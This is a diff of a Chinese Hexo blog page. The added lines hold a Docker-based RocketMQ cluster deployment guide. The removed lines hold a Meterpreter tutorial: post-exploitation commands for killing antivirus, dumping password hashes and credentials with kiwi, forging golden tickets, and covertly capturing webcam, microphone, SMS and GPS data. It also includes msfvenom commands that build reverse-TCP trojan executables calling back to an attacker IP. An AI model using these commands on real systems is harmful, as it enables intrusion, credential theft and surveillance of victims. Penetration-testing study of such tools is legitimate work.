@@ -13,20 +13,20 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://shiro036-joker.github.io/categories/security/meterpreter应用.html"/>
+    <link rel="canonical" href="https://shiro036-joker.github.io/2024/07/07/使用docker在ubuntu上构建rocketmq集群的部署/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Meterpreter应用什么是Meterpreter   Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell">
-<meta property="og:type" content="website">
+        <meta name="description" content="使用Docker在Ubuntu上构建RocketMQ集群的部署论文摘要  RocketMQ是一个分布式消息和流数据平台，以其高可靠性、可扩展性和实时消息传递能力而闻名。本文详细介绍了如何通过Docker在Ubuntu操作系统上部署RocketMQ集群，包括名称服务器（Name Server）、消息代理（Broker）以及管理工具的配置和启动过程。 引言随着互联网应用的增加，消息队列系统在解耦和异步">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://shiro036-joker.github.io/categories/security/Meterpreter%E5%BA%94%E7%94%A8.html">
+<meta property="og:url" content="https://shiro036-joker.github.io/2024/07/07/%E4%BD%BF%E7%94%A8Docker%E5%9C%A8Ubuntu%E4%B8%8A%E6%9E%84%E5%BB%BARocketMQ%E9%9B%86%E7%BE%A4%E7%9A%84%E9%83%A8%E7%BD%B2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Meterpreter应用什么是Meterpreter   Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell">
+<meta property="og:description" content="使用Docker在Ubuntu上构建RocketMQ集群的部署论文摘要  RocketMQ是一个分布式消息和流数据平台，以其高可靠性、可扩展性和实时消息传递能力而闻名。本文详细介绍了如何通过Docker在Ubuntu操作系统上部署RocketMQ集群，包括名称服务器（Name Server）、消息代理（Broker）以及管理工具的配置和启动过程。 引言随着互联网应用的增加，消息队列系统在解耦和异步">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-07-05T01:57:39.356Z">
-<meta property="article:modified_time" content="2024-07-05T01:57:39.356Z">
+<meta property="article:published_time" content="2024-07-07T13:51:08.619Z">
+<meta property="article:modified_time" content="2024-07-07T13:53:44.122Z">
 <meta property="article:author" content="Shirolin">
 <meta name="twitter:card" content="summary">
     
@@ -581,82 +581,240 @@
             <div class="main-content">
 
                 
-                    <div class="page-template-container">
-    
-    
-    
-    <div class="page-template-content markdown-body">
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3"></h1>
+                </div>
+            
+            </div>
+
         
-            <h1 id="Meterpreter应用"><a href="#Meterpreter应用" class="headerlink" title="Meterpreter应用"></a>Meterpreter应用</h1><h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>   Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p>
-<p>   最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。</p>
-<p>   需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</p>
-<p>   Metasploit提供了各个主流平台的Meterpreter版本，包括Windows、Linux，同时支持x86、x64平台，另外，Meterpreter还提供了基于PHP和Java语言的实现。Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter还支持Ruby脚本形式的扩展。所以Ruby语言还很有必要。</p>
-<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1.基本命令"></a>1.基本命令</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span><span class="comment"># 查看Meterpreter帮助</span></span><br><span class="line">background<span class="comment">#返回，把meterpreter后台挂起</span></span><br><span class="line">bgkill<span class="comment"># 杀死一个 meterpreter 脚本</span></span><br><span class="line">bglist<span class="comment">#提供所有正在运行的后台脚本的列表</span></span><br><span class="line">bgrun<span class="comment">#作为一个后台线程运行脚本</span></span><br><span class="line">channel<span class="comment">#显示活动频道</span></span><br><span class="line">sessions -i number <span class="comment"># 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</span></span><br><span class="line">sesssions -k number <span class="comment">#与会话进行交互</span></span><br><span class="line">close<span class="comment"># 关闭通道</span></span><br><span class="line"><span class="built_in">exit</span><span class="comment"># 终止 meterpreter 会话</span></span><br><span class="line">quit<span class="comment"># 终止 meterpreter 会话</span></span><br><span class="line">interact <span class="built_in">id</span> <span class="comment">#切换进一个信道</span></span><br><span class="line">run<span class="comment">#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</span></span><br><span class="line">irb<span class="comment"># 进入 Ruby 脚本模式</span></span><br><span class="line"><span class="built_in">read</span><span class="comment"># 从通道读取数据write# 将数据写入到一个通道</span></span><br><span class="line">run和bgrun<span class="comment"># 前台和后台执行以后它选定的 meterpreter 脚本</span></span><br><span class="line">use<span class="comment"># 加载 meterpreter 的扩展</span></span><br><span class="line">load/use<span class="comment">#加载模块</span></span><br><span class="line">Resource<span class="comment">#执行一个已有的rc脚本</span></span><br><span class="line">sessions <span class="comment"># 列出后台所有的会话</span></span><br><span class="line">sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt; <span class="comment">#进入指定会话</span></span><br><span class="line">sessions -k 杀死指定会话</span><br><span class="line">background <span class="comment">#将当前会话放置后台</span></span><br><span class="line">info <span class="comment">#查看已有模块信息</span></span><br><span class="line">idletime <span class="comment">#查看目标机闲置时间</span></span><br><span class="line">reboot(linux) / shutdown(windows) <span class="comment">#重启/关机</span></span><br><span class="line">shell <span class="comment">#进入目标机cmd shell</span></span><br></pre></td></tr></table></figure></div>
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Shirolin</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-07-07 21:51:08</span>
+        <span class="mobile">2024-07-07 21:51:08</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-07-07 21:53:44</span>
+            <span class="mobile">2024-07-07 21:53:44</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>784 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="使用Docker在Ubuntu上构建RocketMQ集群的部署论文"><a href="#使用Docker在Ubuntu上构建RocketMQ集群的部署论文" class="headerlink" title="使用Docker在Ubuntu上构建RocketMQ集群的部署论文"></a>使用Docker在Ubuntu上构建RocketMQ集群的部署论文</h1><h4 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h4><p>  RocketMQ是一个分布式消息和流数据平台，以其高可靠性、可扩展性和实时消息传递能力而闻名。本文详细介绍了如何通过Docker在Ubuntu操作系统上部署RocketMQ集群，包括名称服务器（Name Server）、消息代理（Broker）以及管理工具的配置和启动过程。</p>
+<h4 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h4><p>随着互联网应用的增加，消息队列系统在解耦和异步通信方面发挥着重要作用。RocketMQ作为一种开源的、快速的消息中间件，广泛用于各种大规模分布式应用中，其高性能和可靠性使其成为业界的首选之一。</p>
+<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p>在本文中，我们选择了Ubuntu操作系统作为部署目标，并通过Docker容器化技术来快速搭建RocketMQ集群。以下是所需的基本环境准备步骤：</p>
+<ol>
+<li><p><strong>安装Docker</strong>: 在Ubuntu上安装Docker，并启动Docker服务。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker.io</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>拉取RocketMQ镜像</strong>: 从Docker Hub上拉取RocketMQ所需的服务器和代理镜像。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull foxiswho/rocketmq:server-4.3.2</span><br><span class="line">docker pull foxiswho/rocketmq:broker-4.3.2</span><br><span class="line">docker pull styletang/rocketmq-console-ng:1.0.0</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h4 id="RocketMQ集群部署步骤"><a href="#RocketMQ集群部署步骤" class="headerlink" title="RocketMQ集群部署步骤"></a>RocketMQ集群部署步骤</h4><h5 id="1-创建名称服务器容器"><a href="#1-创建名称服务器容器" class="headerlink" title="1. 创建名称服务器容器"></a>1. 创建名称服务器容器</h5><p>使用以下命令创建名称服务器容器 <code>rmqserver</code>：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker create -p 9876:9876 --name rmqserver \</span><br><span class="line">-e &quot;JAVA_OPT_EXT=-server -Xms128m -Xmx128m -Xmn128m&quot; \</span><br><span class="line">-e &quot;JAVA_OPTS=-Duser.home=/opt&quot; \</span><br><span class="line">-v rmqserver-logs:/opt/logs \</span><br><span class="line">-v rmqserver-store:/opt/store \</span><br><span class="line">foxiswho/rocketmq:server-4.3.2</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="2-创建消息代理配置文件"><a href="#2-创建消息代理配置文件" class="headerlink" title="2. 创建消息代理配置文件"></a>2. 创建消息代理配置文件</h5><p>创建消息代理 <code>broker.conf</code> 配置文件并编辑：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /itcast/rmq/rmqbroker/conf/</span><br><span class="line">touch /itcast/rmq/rmqbroker/conf/broker.conf</span><br></pre></td></tr></table></figure></div>
+
+<p>编辑 <code>broker.conf</code> 文件并添加以下内容：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brokerIP1=192.168.88.131</span><br><span class="line">namesrvAddr=192.168.88.131:9876</span><br><span class="line">brokerName=boker-tanhua</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="3-创建消息代理容器"><a href="#3-创建消息代理容器" class="headerlink" title="3. 创建消息代理容器"></a>3. 创建消息代理容器</h5><p>使用以下命令创建消息代理容器 <code>rmqbroker</code>：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker create -p 10911:10911 -p 10909:10909 --name rmqbroker \</span><br><span class="line">-e &quot;JAVA_OPTS=-Duser.home=/opt&quot; \</span><br><span class="line">-e &quot;JAVA_OPT_EXT=-server -Xms128m -Xmx128m -Xmn128m&quot; \</span><br><span class="line">-v /itcast/rmq/rmqbroker/conf/broker.conf:/etc/rocketmq/broker.conf \</span><br><span class="line">-v rmqbroker-logs:/opt/logs \</span><br><span class="line">-v rmqbroker-store:/opt/store \</span><br><span class="line">foxiswho/rocketmq:broker-4.3.2</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="4-启动RocketMQ集群"><a href="#4-启动RocketMQ集群" class="headerlink" title="4. 启动RocketMQ集群"></a>4. 启动RocketMQ集群</h5><p>启动名称服务器和消息代理容器：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start rmqserver rmqbroker</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="5-部署RocketMQ控制台"><a href="#5-部署RocketMQ控制台" class="headerlink" title="5. 部署RocketMQ控制台"></a>5. 部署RocketMQ控制台</h5><p>部署RocketMQ控制台用于集群的管理和监控：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -e &quot;JAVA_OPTS=-Drocketmq.namesrv.addr=192.168.88.131:9876 -Dcom.rocketmq.sendMessageWithVIPChannel=false&quot; \</span><br><span class="line">-p 8082:8080 -t styletang/rocketmq-console-ng:1.0.0</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="集群管理和操作"><a href="#集群管理和操作" class="headerlink" title="集群管理和操作"></a>集群管理和操作</h4><ul>
+<li><p><strong>访问RocketMQ控制台</strong>: 在浏览器中打开 <code>http://localhost:8082</code>，使用默认登录凭证（<code>admin</code>&#x2F;<code>admin</code>）登录控制台进行管理操作。</p>
+</li>
+<li><p><strong>停止和删除容器</strong>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker stop rmqserver rmqbroker</span><br><span class="line">docker rm rmqserver rmqbroker</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>本文介绍了如何利用Docker在Ubuntu上快速搭建RocketMQ消息中间件集群。通过以上步骤，可以轻松部署、管理和扩展RocketMQ，以满足不同规模和需求的分布式应用场景。</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a class="link" target="_blank" rel="noopener" href="http://rocketmq.apache.org/">Apache RocketMQ官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://docs.docker.com/">Docker官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://github.com/apache/rocketmq-externals/tree/master/rocketmq-console">RocketMQ控制台NG GitHub仓库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p>通过以上部署步骤和配置，可以在Ubuntu操作系统上构建一个稳定可靠的RocketMQ集群，为分布式消息处理提供强大支持。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> </li>
+        <li><strong>作者:</strong> Shirolin</li>
+        <li><strong>创建于
+                :</strong> 2024-07-07 21:51:08</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-07-07 21:53:44
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2024/07/07/使用Docker在Ubuntu上构建RocketMQ集群的部署/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/07/05/Windows%E5%AE%89%E8%A3%85Redis/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item"></span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
 
 
 
-<h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2 常用命令"></a>2 常用命令</h3><h4 id="2-1-针对安卓手机的一些命令"><a href="#2-1-针对安卓手机的一些命令" class="headerlink" title="2.1 针对安卓手机的一些命令"></a>2.1 针对安卓手机的一些命令</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取手机通讯录： dump_contacts</span><br><span class="line">获取短信记录：dump_sms</span><br><span class="line">控制实验手机发短信：send_sms -d 15330252525 -t</span><br><span class="line"><span class="string">&quot;hello&quot;</span></span><br><span class="line">获取实验手机GPS定位信息：geolocate</span><br><span class="line">获取实验手机Wi-Fi定位信息：wlan_geolocate</span><br><span class="line">控制实验手机录音：record_mic -d 5</span><br><span class="line">获取实验手机相机设备：webcam_list</span><br><span class="line">控制实验手机拍照 ：webcam_snap</span><br><span class="line">直播实验手机摄像头：webcam_stream</span><br></pre></td></tr></table></figure></div>
+        
+    
+</div>
 
-<h4 id="2-2-针对Windows的一些命令"><a href="#2-2-针对Windows的一些命令" class="headerlink" title="2.2 针对Windows的一些命令"></a>2.2 针对Windows的一些命令</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">查看进程：ps</span><br><span class="line">查看当前进程号：getpid</span><br><span class="line">查看权限：getuid</span><br><span class="line">查看系统信息：sysinfo</span><br><span class="line">查看目标机是否为虚拟机：run post/windows/gather/checkvm</span><br><span class="line">查看完整网络设置：route</span><br><span class="line">查看当前权限：getuid</span><br><span class="line">自动提权：getsystem</span><br><span class="line">关闭杀毒软件：run post/windows/manage/killav</span><br><span class="line">启动远程桌面协议：run post/windows/manage/enable_rdp</span><br><span class="line">列举当前登录的用户：run post/windows/gather/enum_logged_on_users</span><br><span class="line">查看当前应用程序：run post/windows/gather/enum_applications</span><br><span class="line">抓取目标机的屏幕截图：load espia ； screengrab</span><br><span class="line">获取相机设备：webcam_list</span><br><span class="line">控制拍照 ：webcam_snap</span><br><span class="line">直播摄像头：webcam_stream</span><br><span class="line">控制录音：record_mic</span><br><span class="line">execute <span class="comment">#在目标机中执行文件 例：execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span></span><br><span class="line">查看当前处于目标机的那个目录：<span class="built_in">pwd</span></span><br><span class="line">查看当前目录：getlwd</span><br><span class="line">导出当前用户密码哈希 run hashdump</span><br><span class="line">用户名：SID：LM哈希：NTLM哈希:::</span><br><span class="line">也可以使用下面这个命令导出 权限更高  run windows/gather/smart_hashdump</span><br><span class="line">抓取自动登录的用户名和密码 run windows/gather/credentials/windows_autologin</span><br><span class="line">直接获取明文密码（注意这个功能需要获取系统权限 获取系统权限需要输入getsystem）</span><br><span class="line">首选终端输入 load kiwi  加载kiwi</span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="3-文件系统命令"><a href="#3-文件系统命令" class="headerlink" title="3.文件系统命令"></a>3.文件系统命令</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat c:\boot.ini#查看文件内容,文件必须存在</span><br><span class="line">del c:\boot.ini #删除指定的文件</span><br><span class="line">upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload setup.exe C:\\windows\\system32</span><br><span class="line">download nimeia.txt /root/Desktop/  # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295***\**\*******125\\Msg2.0.db /root/**</span><br><span class="line">**edit c:\boot.ini** # 编辑文件</span><br><span class="line">getlwd#打印本地目录</span><br><span class="line">getwd#打印工作目录</span><br><span class="line">lcd#更改本地目录</span><br><span class="line">ls#列出在当前目录中的文件列表</span><br><span class="line">lpwd#打印本地目录</span><br><span class="line">pwd#输出工作目录</span><br><span class="line">cd c:\\ #进入目录文件下</span><br><span class="line">rm file #删除文件</span><br><span class="line">mkdir dier #在受害者系统上的创建目录</span><br><span class="line">rmdir#受害者系统上删除目录</span><br><span class="line">dir#列出目标主机的文件和文件夹信息</span><br><span class="line">mv#修改目标主机上的文件名</span><br><span class="line">search -d d:\\www -f web.config #search 文件，如search -d c:\\ -f**.doc*</span><br><span class="line">*meterpreter &gt; search -f autoexec.bat* #搜索文件</span><br><span class="line">meterpreter &gt; search -f sea**.bat c:\\xamp\\*</span><br><span class="line">*enumdesktops*   #用户登录数</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Meterpreter中常用的反弹类型"><a href="#Meterpreter中常用的反弹类型" class="headerlink" title="Meterpreter中常用的反弹类型"></a>Meterpreter中常用的反弹类型</h2><p>1.reverse_tcp</p>
-<p>这是一个基于TCP的反向链接反弹shell, 使用起来很稳定</p>
-<p>（1）Linux：</p>
-<p>使用下列命令生成一个Linux下反弹shell木马：</p>
-<p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.102 lport&#x3D;4444 -f elf -o shell</p>
-<p>看上图，我们可以看见目录下已经成功生成木马文件isshell。然后我们给文件加上可执行权限。然后我们打开Metasploit，使用模块handler，设置payload，注意：这里设置的payload要和我们生成木马所使用的payload一样。</p>
-
-
-<p>设置下地址和端口，我们就开始监听了</p>
-
-
-<p>这边运行一下我们的反弹shell木马，可以发现成功反弹回shell了</p>
-<p>（2）Windows：</p>
-<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;[你的IP] lport&#x3D;[端口] -f exe -o 要生成的文件名</p>
-<p>msfvenom -p  windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.102 lport&#x3D;4444 -f exe -o  shell.exe</p>
-
-
-
-
-<p>反向连接shell,使用起来很稳定，需要设置LHOST</p>
-<p>2.reverse_http</p>
